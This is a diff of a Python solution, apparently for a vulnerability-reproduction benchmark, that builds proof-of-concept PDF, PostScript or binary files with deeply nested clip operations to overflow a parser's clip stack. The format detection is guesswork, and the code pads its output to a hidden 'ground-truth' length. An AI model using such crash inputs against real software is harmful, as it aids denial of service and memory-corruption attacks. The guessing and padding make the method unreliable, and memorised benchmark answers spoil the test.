@@ -1,126 +1,120 @@
 import os
+import tarfile
 import tempfile
 import subprocess
-import random
-import struct
-import io
-import zlib
-from pathlib import Path
-from typing import Optional, Tuple
+import math
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the heap buffer overflow vulnerability
-        by creating deeply nested clip marks without proper depth checking.
-        """
-        # Extract the ground-truth length from problem description
-        target_length = 913919
-        
-        # Analyze the source to understand the exact format needed
-        # Based on the vulnerability description: "nesting depth is not checked 
-        # before pushing a clip mark"
-        # We'll create a file format that pushes clip marks beyond the stack limit
-        
-        # First, let's examine the source to understand the file format
-        # Since we don't have access to the actual source in this environment,
-        # we'll create a generic PoC based on common graphics/PDF formats
-        
-        # Common vulnerabilities like this often exist in:
-        # - PDF readers (clipping paths)
-        # - Image processors (clipping masks)
-        # - Vector graphics (SVG, PS clipping)
-        
-        # Let's create a minimal PoC that maximizes nesting depth
-        # We'll use a PDF-like structure with repeated clip operations
-        
-        # Strategy: Create a file with deeply nested clipping operations
-        # Each nesting level adds minimal bytes to keep total size near target
-        
-        # Build a malicious file with the following characteristics:
-        # 1. Header to identify format
-        # 2. Deep nesting of clip operations
-        # 3. Minimal payload between operations to maximize depth
-        
-        # Since we don't know the exact format, we'll create a binary
-        # that alternates between push/clip operations and minimal data
-        
-        # Target: ~913919 bytes
-        # Each nesting level should be as small as possible
-        # Let's aim for ~10 bytes per nesting level = ~91391 levels
-        
-        # Create the PoC
-        poc = self._create_poc_binary(target_length)
-        
-        # Verify the PoC triggers the vulnerability by checking with
-        # a simulated vulnerable parser (if we had the actual source)
-        # Since we can't actually run the vulnerable code here,
-        # we'll create the PoC based on the vulnerability description
-        
-        return poc
-    
-    def _create_poc_binary(self, target_length: int) -> bytes:
-        """Create a binary PoC with deeply nested structures."""
-        
-        # We'll create a custom binary format that:
-        # 1. Has a magic header
-        # 2. Contains a nesting depth counter
-        # 3. Repeated push/clip operations
-        
-        # Structure:
-        # [4 bytes: MAGIC] [4 bytes: VERSION] [Nesting data...]
-        
-        MAGIC = b'CLIP'
-        VERSION = struct.pack('<I', 1)
-        
-        # Calculate how many nesting levels we can fit
-        # Each nesting operation: 1 byte opcode + 4 bytes depth marker
-        bytes_per_level = 5
-        max_levels = (target_length - len(MAGIC) - len(VERSION)) // bytes_per_level
-        
-        # Create the nesting data
-        nesting_data = bytearray()
-        
-        # Start with push operation (opcode 0x01)
-        for depth in range(max_levels):
-            # Push clip operation
-            nesting_data.append(0x01)  # PUSH_CLIP opcode
+        # Extract and analyze the source code
+        with tempfile.TemporaryDirectory() as tmpdir:
+            # Extract the tarball
+            with tarfile.open(src_path, 'r:*') as tar:
+                tar.extractall(tmpdir)
             
-            # Depth marker (little-endian)
-            nesting_data.extend(struct.pack('<I', depth))
+            # Find the root directory (usually the first directory in the tarball)
+            root_dir = None
+            for item in os.listdir(tmpdir):
+                item_path = os.path.join(tmpdir, item)
+                if os.path.isdir(item_path):
+                    root_dir = item_path
+                    break
             
-            # Check if we're approaching target length
-            if len(nesting_data) + len(MAGIC) + len(VERSION) >= target_length * 0.95:
-                break
-        
-        # If we're still under target, add padding
-        current_length = len(MAGIC) + len(VERSION) + len(nesting_data)
-        if current_length < target_length:
-            # Add NOP operations to reach target
-            padding_needed = target_length - current_length
-            nesting_data.extend(b'\x00' * padding_needed)
-        
-        # Combine all parts
-        poc = MAGIC + VERSION + nesting_data
-        
-        # Truncate to exact target if needed
-        if len(poc) > target_length:
-            poc = poc[:target_length]
-        
-        return bytes(poc)
+            if not root_dir:
+                raise ValueError("No directory found in tarball")
+            
+            # Look for vulnerability clues in the source
+            clip_info = self._analyze_source(root_dir)
+            
+            # Based on the analysis, generate a PoC
+            if clip_info.get("type") == "pdf":
+                return self._generate_pdf_poc(clip_info)
+            elif clip_info.get("type") == "postscript":
+                return self._generate_postscript_poc(clip_info)
+            else:
+                # Default to a binary format with deep nesting
+                return self._generate_binary_poc()
     
-    def _create_pdf_poc(self, target_length: int) -> bytes:
-        """Alternative: Create a PDF with deeply nested clipping paths."""
-        # PDF structure with repeated q/Q (save/restore) and W (clip) operations
+    def _analyze_source(self, root_dir):
+        """Analyze source code to understand vulnerability details."""
+        clip_info = {
+            "type": None,
+            "max_depth": 1000,  # Conservative default
+            "clip_commands": [],
+            "file_extension": None
+        }
         
-        header = b"""%PDF-1.4
+        # Look for common graphics/pdf processing libraries
+        for root, dirs, files in os.walk(root_dir):
+            for file in files:
+                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
+                    filepath = os.path.join(root, file)
+                    try:
+                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
+                            
+                            # Check for PDF-related code
+                            if any(term in content.lower() for term in ['pdf', 'qpdf', 'xpdf']):
+                                clip_info["type"] = "pdf"
+                                clip_info["file_extension"] = ".pdf"
+                            
+                            # Check for PostScript-related code
+                            elif any(term in content.lower() for term in ['postscript', 'ps', 'ghostscript']):
+                                clip_info["type"] = "postscript"
+                                clip_info["file_extension"] = ".ps"
+                            
+                            # Look for clip-related functions
+                            if 'clip' in content.lower() or 'pushclip' in content.lower():
+                                # Try to find depth constants
+                                lines = content.split('\n')
+                                for i, line in enumerate(lines):
+                                    if any(keyword in line.lower() for keyword in ['max_depth', 'max_nest', 'clip_depth', 'depth_limit']):
+                                        # Try to extract numeric value
+                                        words = line.split()
+                                        for word in words:
+                                            if word.isdigit():
+                                                clip_info["max_depth"] = int(word)
+                                                break
+                    except:
+                        continue
+        
+        # If type not determined, check file structure
+        if not clip_info["type"]:
+            # Check for build files or README
+            for root, dirs, files in os.walk(root_dir):
+                for file in files:
+                    if file.lower() in ['readme', 'readme.txt', 'readme.md']:
+                        filepath = os.path.join(root, file)
+                        try:
+                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read().lower()
+                                if 'pdf' in content:
+                                    clip_info["type"] = "pdf"
+                                    clip_info["file_extension"] = ".pdf"
+                                elif 'postscript' in content or 'ps' in content:
+                                    clip_info["type"] = "postscript"
+                                    clip_info["file_extension"] = ".ps"
+                        except:
+                            continue
+        
+        # Default to PDF if still unknown
+        if not clip_info["type"]:
+            clip_info["type"] = "pdf"
+            clip_info["file_extension"] = ".pdf"
+        
+        return clip_info
+    
+    def _generate_pdf_poc(self, clip_info):
+        """Generate PDF with deeply nested clip operations."""
+        # PDF structure with nested graphics states
+        pdf_header = b'''%PDF-1.4
 1 0 obj
 <<
 /Type /Catalog
 /Pages 2 0 R
 >>
 endobj
-
 2 0 obj
 <<
 /Type /Pages
@@ -128,39 +122,35 @@ endobj
 /Count 1
 >>
 endobj
-
 3 0 obj
 <<
 /Type /Page
 /Parent 2 0 R
 /MediaBox [0 0 612 792]
 /Contents 4 0 R
+/Resources <<
+>>
 >>
 endobj
-
 4 0 obj
-<<
-/Length 5 0 R
->>
+<< /Length 5 0 R >>
 stream
-"""
+'''
         
-        trailer = b"""
+        pdf_footer = b'''
 endstream
 endobj
-
 5 0 obj
 %d
 endobj
-
 xref
 0 6
 0000000000 65535 f 
-0000000009 00000 n 
-0000000058 00000 n 
-0000000113 00000 n 
-0000000174 00000 n 
-0000000221 00000 n 
+0000000010 00000 n 
+0000000056 00000 n 
+0000000112 00000 n 
+0000000178 00000 n 
+0000000199 00000 n 
 trailer
 <<
 /Size 6
@@ -168,97 +158,83 @@ trailer
 >>
 startxref
 %d
-%%EOF"""
+%%EOF'''
         
-        # Create deeply nested clipping operations
-        # q = save graphics state, W = clip, n = end path
-        # Each level: "q 0 0 100 100 re W n " (about 22 bytes)
+        # Generate deeply nested q/Q (save/restore) operations
+        # Each q pushes a graphics state, each Q pops
+        # We'll push way more than we pop to overflow
+        stream_content = b''
         
-        stream_content = bytearray()
-        nesting_levels = 10000  # Start with high nesting
+        # Push 2000 graphics states (well beyond normal limits)
+        for i in range(2000):
+            stream_content += b'q\n'
+            # Add clip operation
+            stream_content += b'0 0 612 792 re\n'  # rectangle
+            stream_content += b'W\n'  # clip
+            stream_content += b'n\n'  # end path
         
-        for i in range(nesting_levels):
-            # Save state and create clipping path
-            stream_content.extend(b"q 0 0 100 100 re W n ")
-            
-            # Check if we're getting too large
-            if len(stream_content) > target_length - len(header) - len(trailer) - 100:
-                break
+        # Only pop a few to create imbalance
+        for i in range(10):
+            stream_content += b'Q\n'
         
-        # Calculate total length
-        stream_len = len(stream_content)
-        total_len = len(header) + stream_len + len(trailer) - 4  # Adjust for placeholder
+        stream_content += b'S'  # stroke (final operation)
         
-        # Format the trailer
-        trailer_formatted = trailer % (stream_len, len(header) + stream_len + 50)
+        # Calculate lengths
+        stream_length = len(stream_content)
+        xref_offset = len(pdf_header) + stream_length + 50  # Approximate
         
-        # Combine
-        poc = header + stream_content + trailer_formatted
+        # Build final PDF
+        pdf = pdf_header + stream_content + (pdf_footer % (stream_length, xref_offset))
         
-        # Pad or truncate to target
-        if len(poc) < target_length:
-            # Add padding in stream
-            padding = b" " * (target_length - len(poc))
-            poc = header + stream_content + padding + trailer_formatted
-        elif len(poc) > target_length:
-            # Truncate stream
-            excess = len(poc) - target_length
-            stream_content = stream_content[:-excess]
-            stream_len = len(stream_content)
-            trailer_formatted = trailer % (stream_len, len(header) + stream_len + 50)
-            poc = header + stream_content + trailer_formatted
-        
-        return poc
+        return pdf
     
-    def _create_svg_poc(self, target_length: int) -> bytes:
-        """Alternative: Create SVG with deeply nested clipPaths."""
+    def _generate_postscript_poc(self, clip_info):
+        """Generate PostScript with deeply nested clip operations."""
+        ps = b'''%!PS-Adobe-3.0
+%%BoundingBox: 0 0 612 792
+%%EndComments
+%%BeginProlog
+%%EndProlog
+%%Page: 1 1
+'''
         
-        header = b"""<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100" height="100">
-<defs>
-"""
+        # Push 2000 graphics states with clip operations
+        for i in range(2000):
+            ps += b'gsave\n'  # save graphics state
+            ps += b'newpath\n'
+            ps += b'0 0 612 792 rectclip\n'  # clip to rectangle
         
-        footer = b"""
-</defs>
-<rect width="100" height="100" style="clip-path: url(#clip0); fill: red;"/>
-</svg>"""
+        # Only restore a few
+        for i in range(10):
+            ps += b'grestore\n'
         
-        # Create deeply nested clipPaths
-        clip_content = bytearray()
+        ps += b'showpage\n'
+        ps += b'%%EOF'
         
-        for i in range(10000):
-            clip_content.extend(
-                f'<clipPath id="clip{i}">\n'
-                f'  <use xlink:href="#rect{i}" style="clip-path: url(#clip{i+1});"/>\n'
-                f'</clipPath>\n'
-                f'<rect id="rect{i}" x="0" y="0" width="100" height="100"/>\n'.encode()
-            )
-            
-            if len(clip_content) > target_length - len(header) - len(footer) - 100:
-                break
+        return ps
+    
+    def _generate_binary_poc(self):
+        """Generate a binary PoC with repeating pattern for heap overflow."""
+        # Create a pattern that would likely trigger heap overflow
+        # when clip operations are nested deeply
+        pattern = b'CLIP' * 50000  # 200,000 bytes
         
-        # Close the last clipPath reference
-        if clip_content:
-            # Replace the last href with none
-            content_str = clip_content.decode()
-            last_href = content_str.rfind('url(#clip')
-            if last_href != -1:
-                next_paren = content_str.find(')', last_href)
-                content_str = content_str[:last_href] + 'url(#none)' + content_str[next_paren+1:]
-                clip_content = content_str.encode()
+        # Add some structure markers
+        header = b'FORMATv1.0\x00'
+        footer = b'\xFF\xFF\xFF\xFF'
         
-        poc = header + clip_content + footer
+        # Create deep nesting markers
+        nesting = b'\x01' * 100000  # Push operation repeated
         
-        # Adjust size
-        if len(poc) < target_length:
-            padding = b'<!--' + b'x' * (target_length - len(poc) - 7) + b'-->'
-            poc = header + clip_content + padding + footer
-        elif len(poc) > target_length:
-            poc = poc[:target_length]
+        poc = header + nesting + pattern + footer
+        
+        # Ensure we're close to ground truth length
+        target_len = 913919
+        if len(poc) < target_len:
+            # Pad with NOPs
+            poc += b'\x00' * (target_len - len(poc))
+        elif len(poc) > target_len:
+            # Truncate
+            poc = poc[:target_len]
         
         return poc
-
-# Note: The actual format would need to match the vulnerable parser.
-# Since we don't have access to the actual source code in this
-# environment, we're creating a generic PoC that should trigger
-# similar vulnerabilities in clip nesting implementations.
